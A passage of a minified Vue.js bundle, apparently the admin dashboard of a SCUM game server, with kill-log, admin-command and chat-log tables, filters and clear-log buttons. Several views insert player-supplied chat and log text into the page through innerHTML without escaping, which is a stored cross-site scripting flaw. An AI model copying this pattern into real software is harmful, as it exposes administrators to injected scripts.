ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.killListFilter.killerSteamId,callback:function(t){e.$set(e.killListFilter,"killerSteamId",t)},expression:"killListFilter.killerSteamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("击杀者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.killListFilter.killerName,callback:function(t){e.$set(e.killListFilter,"killerName",t)},expression:"killListFilter.killerName"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("击杀者所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.killListFilter.killerArea,callback:function(t){e.$set(e.killListFilter,"killerArea",t)},expression:"killListFilter.killerArea"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1)],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("被击杀者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.killListFilter.victimSteamId,callback:function(t){e.$set(e.killListFilter,"victimSteamId",t)},expression:"killListFilter.victimSteamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("被击杀者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.killListFilter.victimName,callback:function(t){e.$set(e.killListFilter,"victimName",t)},expression:"killListFilter.victimName"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("被击杀者所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.killListFilter.victimArea,callback:function(t){e.$set(e.killListFilter,"victimArea",t)},expression:"killListFilter.victimArea"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1)],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("击杀武器:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.killListFilter.weapon,callback:function(t){e.$set(e.killListFilter,"weapon",t)},expression:"killListFilter.weapon"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("是否活动击杀:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.killListFilter.isEventKill,callback:function(t){e.$set(e.killListFilter,"isEventKill",t)},expression:"killListFilter.isEventKill"}},[i("a-select-option",{key:"true",attrs:{title:"活动击杀"}},[e._v("活动击杀")]),i("a-select-option",{key:"false",attrs:{title:"正常击杀"}},[e._v("正常击杀")])],1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("发生时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.killListFilter.timestampStart,e.killListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.killListFilter,"timestampStart",t[0]),e.$set(e.killListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.killListColumns,"data-source":e.killListData,expandedRowKeys:e.expandedKillIds,"row-key":"id",pagination:!1,loading:e.loadingKillListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedKillIds.find((function(e){return e===i.id}))&&e.expandedKillIds.push(i.id);else{var a=Object.keys(e.expandedKillIds).find((function(t){return e.expandedKillIds[t]===i.id}));void 0!==a&&e.expandedKillIds.splice(a,1)}}},scopedSlots:e._u([{key:"killerSteamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"killerName",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.killerUser&&a.killerUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.killerUser.userName}})}}},[e._v("("+e._s(a.killerUser.userName)+")")]):e._e()]}},{key:"killerLocationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.killerLocations)+"("+e._s(a.killerArea)+")")])]}},{key:"victimSteamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"victimName",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.victimUser&&a.victimUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.victimUser.userName}})}}},[e._v("("+e._s(a.victimUser.userName)+")")]):e._e()]}},{key:"victimLocationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.victimLocations)+"("+e._s(a.victimArea)+")")])]}},{key:"weapon",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"distance",fn:function(t){return[i("span",{style:{color:t<=1e3?"#52c41a":"#ff4d4f"}},[e._v(e._s(t)+"m")])]}},{key:"isEventKill",fn:function(t,a){return[i("span",[e._v(e._s(a.isEventKill?"活动击杀":"普通击杀"))])]}},{key:"occuredTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedKillIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("击杀者坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.killerLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.killerArea)+")")])])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("被击杀者坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.victimLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.victimArea)+")")])])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[i("span",[e._v("击杀距离(立体距离):")]),i("span",{staticStyle:{"margin-left":"10px","font-weight":"bolder"},style:{color:t.distance<=1e3?"#52c41a":"#ff4d4f"}},[e._v(e._s(t.distance)+"m")])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("击杀地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.victimLocations}})],1)]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.killListPagination.pageSize,current:e.killListPagination.pageNum,total:e.killListPagination.total},on:{change:e.onChangeKillListPagination,showSizeChange:e.onShowSizeChangeKillListPagination}})],1)])],1)}),[],!1,null,"1a45382c",null),Ot=zt.exports,qt={name:"AdminCommand",components:{MapLocations:J},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,loadingAdminCommandListTable:!1,adminCommandListFilter:{scumId:void 0,steamId:void 0,content:void 0,timeStampStart:void 0,timeStampEnd:void 0},adminCommandListColumns:[{title:"指令内容",key:"content",dataIndex:"content",width:250,align:"center",scopedSlots:{customRender:"content"}},{title:"发送者游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"发送者Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"发送者在线Session ID",key:"sessionId",dataIndex:"sessionId",width:180,align:"center",scopedSlots:{customRender:"sessionId"}},{title:"发送时间",key:"sendTimeStamp",dataIndex:"sendTimeStamp",width:150,align:"center",scopedSlots:{customRender:"sendTimeStamp"}}],adminCommandListData:[],adminCommandListPagination:{pageSize:20,pageNum:1,total:0},expandedAdminCommandIds:[],selectedRowKeys:[]}},mounted:function(){this.getAdminCommandList()},methods:{onAdminCommandListCleanFilter:function(){var e=this;this.adminCommandListPagination.pageNum=1,this.$nextTick((function(){e.getAdminCommandList(!0)}))},onAdminCommandListFilter:function(){var e=this;this.adminCommandListPagination.pageNum=1,this.$nextTick((function(){e.getAdminCommandList()}))},onChangeAdminCommandListPagination:function(e){var t=this;this.adminCommandListPagination.pageNum=e,this.$nextTick((function(){t.getAdminCommandList()}))},onShowSizeChangeAdminCommandListPagination:function(e,t){var i=this;this.adminCommandListPagination.pageNum=1,this.adminCommandListPagination.pageSize=t,this.$nextTick((function(){i.getAdminCommandList()}))},getAdminCommandList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.adminCommandListPagination,n=a.pageNum,r=a.pageSize,e?(t.adminCommandListFilter={type:void 0,status:void 0,buyId:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.adminCommandListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingAdminCommandListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/adminCommandAdminSys/list",params:o});case 6:c=i.sent,t.loadingAdminCommandListTable=!1,200===c.status&&(t.adminCommandListPagination.total=c.data.count,t.adminCommandListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingAdminCommandListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.adminCommandListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},cleanAdminCommand:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/adminCommandAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getAdminCommandList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},Bt=qt,Ht=Object(S.a)(Bt,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"管理员指令日志"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空管理员指令日志吗"},on:{confirm:e.cleanAdminCommand}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空管理员指令日志")])],1)]:e._e()],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onAdminCommandListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onAdminCommandListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"100px","text-align":"right",display:"inline-block"}},[e._v("发送者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.adminCommandListFilter.scumId,callback:function(t){e.$set(e.adminCommandListFilter,"scumId",t)},expression:"adminCommandListFilter.scumId"}}),i("div",{staticStyle:{width:"100px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("发送者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.adminCommandListFilter.steamId,callback:function(t){e.$set(e.adminCommandListFilter,"steamId",t)},expression:"adminCommandListFilter.steamId"}}),i("div",{staticStyle:{width:"100px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("指令内容:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.adminCommandListFilter.content,callback:function(t){e.$set(e.adminCommandListFilter,"content",t)},expression:"adminCommandListFilter.content"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"100px","text-align":"right",display:"inline-block"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.adminCommandListFilter.timestampStart,e.adminCommandListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.adminCommandListFilter,"timestampStart",t[0]),e.$set(e.adminCommandListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.adminCommandListColumns,"data-source":e.adminCommandListData,expandedRowKeys:e.expandedAdminCommandIds,"row-key":"id",pagination:!1,loading:e.loadingAdminCommandListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedAdminCommandIds.find((function(e){return e===i.id}))&&e.expandedAdminCommandIds.push(i.id);else{var a=Object.keys(e.expandedAdminCommandIds).find((function(t){return e.expandedAdminCommandIds[t]===i.id}));void 0!==a&&e.expandedAdminCommandIds.splice(a,1)}}},scopedSlots:e._u([{key:"content",fn:function(t,a){return[i("div",{staticStyle:{"text-overflow":"ellipsis","overflow-x":"hidden","white-space":"nowrap"},style:{cursor:void 0===e.expandedAdminCommandIds.find((function(e){return e===a.id}))?"pointer":"auto"},attrs:{title:void 0===e.expandedAdminCommandIds.find((function(e){return e===a.id}))?t+"\n【点击展开】":t},on:{click:function(t){void 0===e.expandedAdminCommandIds.find((function(e){return e===a.id}))&&e.expandedAdminCommandIds.push(a.id)}}},[e._v(" "+e._s(t)+" ")])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.adminCommandUser&&a.adminCommandUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.adminCommandUser.userName}})}}},[e._v("("+e._s(a.adminCommandUser.userName)+")")]):e._e()]}},{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"sessionId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"sendTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedAdminCommandIds.find((function(e){return e===t.id}))?[t.otherConfig&&void 0!==t.otherConfig.locations&&void 0!==t.otherConfig.area?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("涉事坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.locations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.area)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.locations}})],1)]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("消息内容")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.content)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.content.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.adminCommandListPagination.pageSize,current:e.adminCommandListPagination.pageNum,total:e.adminCommandListPagination.total},on:{change:e.onChangeAdminCommandListPagination,showSizeChange:e.onShowSizeChangeAdminCommandListPagination}})],1)])],1)}),[],!1,null,"89180daa",null),jt=Ht.exports,Yt={name:"ChatMessage",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,chatMessageTypeKeyValue:{Global:"公屏消息",Admin:"管理消息",Squad:"队内消息",Local:"附近消息"},cleanLoading:!1,loadingChatMessageListTable:!1,chatMessageListFilter:{type:void 0,scumId:void 0,steamId:void 0,content:void 0,timeStampStart:void 0,timeStampEnd:void 0,noRobot:void 0},chatMessageListColumns:[{title:"指令内容",key:"content",dataIndex:"content",width:250,align:"center",scopedSlots:{customRender:"content"}},{title:"消息类型",key:"type",dataIndex:"type",width:100,align:"center",scopedSlots:{customRender:"type"}},{title:"发送者游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"发送者Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"发送者在线Session ID",key:"sessionId",dataIndex:"sessionId",width:180,align:"center",scopedSlots:{customRender:"sessionId"}},{title:"发送时间",key:"sendTimeStamp",dataIndex:"sendTimeStamp",width:150,align:"center",scopedSlots:{customRender:"sendTimeStamp"}}],chatMessageListData:[],chatMessageListPagination:{pageSize:20,pageNum:1,total:0},expandedChatMessageIds:[],selectedRowKeys:[]}},mounted:function(){this.getChatMessageList()},methods:{onChatMessageListCleanFilter:function(){var e=this;this.chatMessageListPagination.pageNum=1,this.$nextTick((function(){e.getChatMessageList(!0)}))},onChatMessageListFilter:function(){var e=this;this.chatMessageListPagination.pageNum=1,this.$nextTick((function(){e.getChatMessageList()}))},onChangeChatMessageListPagination:function(e){var t=this;this.chatMessageListPagination.pageNum=e,this.$nextTick((function(){t.getChatMessageList()}))},onShowSizeChangeChatMessageListPagination:function(e,t){var i=this;this.chatMessageListPagination.pageNum=1,this.chatMessageListPagination.pageSize=t,this.$nextTick((function(){i.getChatMessageList()}))},getChatMessageList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.chatMessageListPagination,n=a.pageNum,r=a.pageSize,e?(t.chatMessageListFilter={type:void 0,status:void 0,buyId:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.chatMessageListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingChatMessageListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/chatMessageAdminSys/list",params:o});case 6:c=i.sent,t.loadingChatMessageListTable=!1,200===c.status&&(t.chatMessageListPagination.total=c.data.count,t.chatMessageListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingChatMessageListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.chatMessageListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},cleanChatMessage:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/chatMessageAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getChatMessageList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},Gt=Yt,Kt=Object(S.a)(Gt,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"游戏聊天记录"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空游戏聊天日志吗"},on:{confirm:e.cleanChatMessage}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空游戏聊天日志")])],1)]:e._e()],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onChatMessageListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onChatMessageListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("消息类型:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.chatMessageListFilter.type,callback:function(t){e.$set(e.chatMessageListFilter,"type",t)},expression:"chatMessageListFilter.type"}},e._l(e.chatMessageTypeKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{label:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("发送者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.chatMessageListFilter.scumId,callback:function(t){e.$set(e.chatMessageListFilter,"scumId",t)},expression:"chatMessageListFilter.scumId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("发送者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.chatMessageListFilter.steamId,callback:function(t){e.$set(e.chatMessageListFilter,"steamId",t)},expression:"chatMessageListFilter.steamId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("指令内容:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.chatMessageListFilter.content,callback:function(t){e.$set(e.chatMessageListFilter,"content",t)},expression:"chatMessageListFilter.content"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD 